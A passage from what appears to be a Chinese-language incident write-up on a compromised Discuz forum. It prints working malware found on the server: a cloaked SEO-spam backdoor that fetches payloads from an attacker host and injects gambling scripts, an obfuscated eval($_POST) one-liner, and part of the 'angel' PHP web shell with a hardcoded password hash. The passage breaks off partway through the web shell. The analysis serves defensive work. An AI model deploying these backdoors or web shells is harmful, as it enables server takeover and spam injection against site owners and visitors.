underline;">);</span>
$<span style="color: #e7c547;">KBot</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'Baiduspider'</span>,<span style="color: #70c0b1;">'Googlebot'</span>,<span style="color: #70c0b1;">'Yahoo'</span>,<span style="color: #70c0b1;">'Bingbot'</span>,<span style="color: #70c0b1;">'Sosospider'</span>,<span style="color: #70c0b1;">'Sogou'</span>,<span style="color: #70c0b1;">'36</span><span style="color: #70c0b1; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #e7c547;">Key</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'anquan.org'</span>,<span style="color: #70c0b1;">'google.com'</span>,<span style="color: #70c0b1;">'soso.com'</span>,<span style="color: #70c0b1;">'%e8%b5%8c'</span>,<span style="color: #70c0b1;">'%e9%aa%b0'</span>,<span style="color: #70c0b1;">'%e9%b1%</span><span style="color: #70c0b1; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">dec0de</span>($<span style="color: #e7c547;">fileDir</span>,$<span style="color: #e7c547;">data</span>){
$<span style="color: #e7c547;">dataArr</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">':'</span>,$<span style="color: #e7c547;">data</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">Keys</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">':'</span>,<span style="color: #eaeaea; background-color: #000000;">base64_decode(str_rot13(pack(</span><span style="color: #70c0b1;">'H*'</span>,$<span style="color: #e7c547;">dataArr</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>]))));
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">News</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">':'</span>,<span style="color: #eaeaea; background-color: #000000;">base64_decode(str_rot13(pack(</span><span style="color: #70c0b1;">'H*'</span>,$<span style="color: #e7c547;">dataArr</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>]))));
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">Links</span>= <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">':'</span>,<span style="color: #eaeaea; background-color: #000000;">base64_decode(str_rot13(pack(</span><span style="color: #70c0b1;">'H*'</span>,$<span style="color: #e7c547;">dataArr</span>[<span style="color: #eaeaea; background-color: #000000;">2</span>]))));
<span style="background-color: #424242;"> </span>   @<span style="color: #b9ca4a;">include</span>($<span style="color: #e7c547;">fileDir</span>.<span style="color: #70c0b1;">'.Wh0AmI.MODEL'</span>);<span style="color: #d54e53; font-weight: bold;">die</span>;
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getdata</span>($<span style="color: #e7c547;">data_url</span>){
<span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'curl_exec'</span>)) {
$<span style="color: #e7c547;">sp_curl</span> = @<span style="color: #eaeaea; background-color: #000000;">curl_init(</span>);
<span style="color: #eaeaea; background-color: #000000;">curl_setopt(</span>$<span style="color: #e7c547;">sp_curl</span>, <span style="color: #d54e53; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #e7c547;">data_url</span>);
<span style="color: #eaeaea; background-color: #000000;">curl_setopt(</span>$<span style="color: #e7c547;">sp_curl</span>, <span style="color: #d54e53; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #eaeaea; background-color: #000000;">0</span>);
<span style="color: #eaeaea; background-color: #000000;">curl_setopt(</span>$<span style="color: #e7c547;">sp_curl</span>, <span style="color: #d54e53; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #eaeaea; background-color: #000000;">5</span>);
<span style="color: #eaeaea; background-color: #000000;">curl_setopt(</span>$<span style="color: #e7c547;">sp_curl</span>, <span style="color: #d54e53; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #eaeaea; background-color: #000000;">1</span>);
$<span style="color: #e7c547;">contents</span> = @<span style="color: #eaeaea; background-color: #000000;">curl_exec(</span>$<span style="color: #e7c547;">sp_curl</span>);
@<span style="color: #eaeaea; background-color: #000000;">curl_close(</span>$<span style="color: #e7c547;">sp_curl</span>);
}<span style="color: #b9ca4a;">elseif</span>(<span style="color: #eaeaea; background-color: #000000;">function_exists(</span><span style="color: #70c0b1;">'stream_context_create'</span>)) {
$<span style="color: #e7c547;">sp_cont</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'http'</span> =<span style="color: #7aa6da;">&gt;</span> <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'method'</span> =&gt; <span style="color: #70c0b1;">'GET'</span>,<span style="color: #70c0b1;">'timeout'</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">5</span>));
$<span style="color: #e7c547;">sp_stre</span> = @<span style="color: #eaeaea; background-color: #000000;">stream_context_create(</span>$<span style="color: #e7c547;">sp_cont</span>);
$<span style="color: #e7c547;">contents</span> = @<span style="color: #eaeaea; background-color: #000000;">file_get_contents(</span>$<span style="color: #e7c547;">data_url</span>, <span style="color: #7aa6da;">false</span>, $<span style="color: #e7c547;">sp_stre</span>);
}<span style="color: #b9ca4a;">else</span>{
$<span style="color: #e7c547;">handle</span> = @<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">data_url</span>, <span style="color: #70c0b1;">"rb"</span>);<span style="color: #d54e53; background-color: #424242;"> </span>
$<span style="color: #e7c547;">contents</span> = @<span style="color: #eaeaea; background-color: #000000;">stream_get_contents(</span>$<span style="color: #e7c547;">handle</span>);<span style="color: #d54e53; background-color: #424242;"> </span>
@<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">handle</span>);
}
<span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">contents</span>;
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">show</span>($<span style="color: #e7c547;">fileDir</span>){
$<span style="color: #e7c547;">filename</span>=$<span style="color: #e7c547;">fileDir</span><span style="color: #d54e53; font-weight: bold;">.</span><span style="color: #eaeaea; background-color: #000000;">md5(</span>$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'HTTP_HOST'</span>].$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'REQUEST_URI'</span>]);
<span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">is_file(</span>$<span style="color: #e7c547;">filename</span>)){
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span>=@<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">filename</span>,<span style="color: #70c0b1;">'r'</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">data</span>=@<span style="color: #eaeaea; background-color: #000000;">fread(</span>$<span style="color: #e7c547;">fp</span>,<span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">filename</span>));
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">empty(</span>$<span style="color: #e7c547;">data</span>)) {@<span style="color: #eaeaea; background-color: #000000;">unlink(</span>$<span style="color: #e7c547;">filename</span>);<span style="color: #b9ca4a;">return</span>;}
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">dec0de(</span>$<span style="color: #e7c547;">fileDir</span>,$<span style="color: #e7c547;">data</span>);
} <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">data</span>=<span style="color: #eaeaea; background-color: #000000;">getdata(</span><span style="color: #70c0b1;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'HTTP_H</span><span style="color: #70c0b1; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span>=@<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">filename</span>,<span style="color: #70c0b1;">'w'</span>);
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">fp</span>,$<span style="color: #e7c547;">data</span>);
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">strlen(</span>$<span style="color: #e7c547;">data</span>) &gt; <span style="color: #eaeaea; background-color: #000000;">1000</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">dec0de(</span>$<span style="color: #e7c547;">fileDir</span>,$<span style="color: #e7c547;">data</span>);
<span style="background-color: #424242;"> </span>   }
}}
<span style="color: #b9ca4a;">if</span>(!<span style="color: #eaeaea; background-color: #000000;">in_array(</span>$<span style="color: #e7c547;">IP</span>,$<span style="color: #e7c547;">KIP</span>)){
<span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">KBot</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">KBots</span>){<span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">stristr(</span>$<span style="color: #e7c547;">Bot</span>,$<span style="color: #e7c547;">KBots</span>)){
<span style="color: #eaeaea; background-color: #000000;">show(</span>$<span style="color: #e7c547;">fileDir</span>);
}}<span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">Key</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">Keys</span>){
<span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">stristr(</span>$<span style="color: #e7c547;">Ref</span>,$<span style="color: #e7c547;">Keys</span>)){
<span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #70c0b1; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #c397d8;">&lt;?php</span> $<span style="color: #e7c547;">mt</span>=<span style="color: #70c0b1;">"mFsKCleRfU"</span>; $<span style="color: #e7c547;">ojj</span>=<span style="color: #70c0b1;">"IEBleldle"</span>; $<span style="color: #e7c547;">hsa</span>=<span style="color: #70c0b1;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #e7c547;">fnx</span>=<span style="color: #70c0b1;">"Ow=="</span>; $<span style="color: #e7c547; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">str_replace(</span><span style="color: #70c0b1; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); $</span><span style="color: #e7c547; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = $</span><span style="color: #e7c547; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #70c0b1; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); $</span><span style="color: #e7c547; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = $</span><span style="color: #e7c547; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #70c0b1; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); $</span><span style="color: #e7c547; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = $</span><span style="color: #e7c547; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">ef</span><span style="text-decoration: underline;">($</span><span style="color: #e7c547; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #70c0b1; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">""</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">ojj</span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">hsa</span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); $</span><span style="color: #e7c547; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php">@<span style="color: #eaeaea; background-color: #000000;">eval(</span>$<span style="color: #7aa6da;">_POST</span>[<span style="color: #70c0b1;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #c397d8;">&lt;?php</span>
<span style="color: #eaeaea; background-color: #000000;">error_reporting(7</span>);
@<span style="color: #eaeaea; background-color: #000000;">set_magic_quotes_runtime(0</span>);
<span style="color: #eaeaea; background-color: #000000;">ob_start(</span>);
$<span style="color: #e7c547;">mtime</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">' '</span>, <span style="color: #eaeaea; background-color: #000000;">microtime(</span>));
$<span style="color: #e7c547;">starttime</span> = $<span style="color: #e7c547;">mtime</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>] + $<span style="color: #e7c547;">mtime</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>];
<span style="color: #eaeaea; background-color: #000000;">define(</span><span style="color: #70c0b1;">'SA_ROOT'</span>, <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'\\'</span>, <span style="color: #70c0b1;">'/'</span>, <span style="color: #eaeaea; background-color: #000000;">dirname(</span><span style="color: #7aa6da;">__FILE__</span>)).<span style="color: #70c0b1;">'/'</span>);
<span style="color: #eaeaea; background-color: #000000;">define(</span><span style="color: #70c0b1;">'IS_WIN'</span>, <span style="color: #7aa6da;">DIRECTORY_SEPARATOR</span> == <span style="color: #70c0b1;">'\\'</span>);
<span style="color: #eaeaea; background-color: #000000;">define(</span><span style="color: #70c0b1;">'IS_COM'</span>, <span style="color: #eaeaea; background-color: #000000;">class_exists(</span><span style="color: #70c0b1;">'COM'</span>) ? <span style="color: #eaeaea; background-color: #000000;">1</span> : <span style="color: #eaeaea; background-color: #000000;">0</span> );
<span style="color: #eaeaea; background-color: #000000;">define(</span><span style="color: #70c0b1;">'IS_GPC'</span>, <span style="color: #eaeaea; background-color: #000000;">get_magic_quotes_gpc(</span>));
$<span style="color: #e7c547;">dis_func</span> = <span style="color: #eaeaea; background-color: #000000;">get_cfg_var(</span><span style="color: #70c0b1;">'disable_functions'</span>);
<span style="color: #eaeaea; background-color: #000000;">define(</span><span style="color: #70c0b1;">'IS_PHPINFO'</span>, (!<span style="color: #eaeaea; background-color: #000000;">eregi(</span><span style="color: #70c0b1;">"phpinfo"</span>,$<span style="color: #e7c547;">dis_func</span>)) ? <span style="color: #eaeaea; background-color: #000000;">1</span> : <span style="color: #eaeaea; background-color: #000000;">0</span> );
@<span style="color: #eaeaea; background-color: #000000;">set_time_limit(0</span>);@<span style="color: #eaeaea; background-color: #000000;">preg_replace(</span><span style="color: #70c0b1;">"/[email]/e"</span>,$<span style="color: #7aa6da;">_POST</span>[<span style="color: #70c0b1;">'Id'</span>],<span style="color: #70c0b1;">"error"</span>);

<span style="color: #b9ca4a;">foreach</span>($<span style="color: #7aa6da;">_POST</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span> =<span style="color: #7aa6da;">&gt;</span> $<span style="color: #e7c547;">value</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">IS_GPC</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">value</span> = <span style="color: #eaeaea; background-color: #000000;">s_array(</span>$<span style="color: #e7c547;">value</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">$key</span> = $<span style="color: #e7c547;">value</span>;
}
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#31243;&#24207;&#37197;&#32622; =====================*/</span>

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">echo encode_pass('angel');exit;</span>
<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
$<span style="color: #e7c547;">pass</span>  = <span style="color: #70c0b1;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">angel</span>

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#21069;&#32512;</span>
$<span style="color: #e7c547;">cookiepre</span> = <span style="color: #70c0b1;">''</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#20316;&#29992;&#22495;</span>
$<span style="color: #e7c547;">cookiedomain</span> = <span style="color: #70c0b1;">''</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#20316;&#29992;&#36335;&#24452;</span>
$<span style="color: #e7c547;">cookiepath</span> = <span style="color: #70c0b1;">'/'</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#26377;&#25928;&#26399;</span>
$<span style="color: #e7c547;">cookielife</span> = <span style="color: #eaeaea; background-color: #000000;">86400</span>;

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
!$<span style="color: #e7c547;">writabledb</span> &amp;&amp; $<span style="color: #e7c547;">writabledb</span> = <span style="color: #70c0b1;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#37197;&#32622;&#32467;&#26463; =====================*/</span>

$<span style="color: #e7c547;">charsetdb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">''</span>,<span style="color: #70c0b1;">'armscii8'</span>,<span style="color: #70c0b1;">'ascii'</span>,<span style="color: #70c0b1;">'big5'</span>,<span style="color: #70c0b1;">'binary'</span>,<span style="color: #70c0b1;">'cp1250'</span>,<span style="color: #70c0b1;">'cp1251'</span>,<span style="color: #70c0b1;">'cp12</span><span style="color: #70c0b1; text-decoration: underline;">56'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'cp1257'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'cp850'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'cp852'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'cp866'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'cp932'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'dec8'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'euc-jp'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'euc-kr'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'gb2312'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'gbk'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'geostd8'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'greek'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'hebrew'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'hp8'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'keybcs2'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'koi8r'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'koi8u'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'latin1'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'latin2'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'latin5'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'latin7'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'macce'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'macroman'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'sjis'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'swe7'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'tis620'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'ucs2'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'ujis'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">charset</span> == <span style="color: #70c0b1;">'utf8'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">charset</span> == <span style="color: #70c0b1;">'big5'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">charset</span> == <span style="color: #70c0b1;">'gbk'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">charset</span> == <span style="color: #70c0b1;">'latin1'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">charset</span> == <span style="color: #70c0b1;">'euc-kr'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">charset</span> == <span style="color: #70c0b1;">'euc-jp'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"content-Type: text/html; charset=euc-jp"</span>);
}

$<span style="color: #e7c547;">self</span> = $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'PHP_SELF'</span>] ? $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'PHP_SELF'</span>] : $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'SCRIPT_NAME'</span>];
$<span style="color: #e7c547;">timestamp</span> = <span style="color: #eaeaea; background-color: #000000;">time(</span>);

<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#36523;&#20221;&#39564;&#35777; =====================*/</span>
<span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">"logout"</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">scookie(</span><span style="color: #70c0b1;">'loginpass'</span>, <span style="color: #70c0b1;">''</span>, -<span style="color: #eaeaea; background-color: #000000;">86400</span> * <span style="color: #eaeaea; background-color: #000000;">365</span>);
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Location: '</span>.$<span style="color: #e7c547;">self</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
}
<span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">pass</span>) {
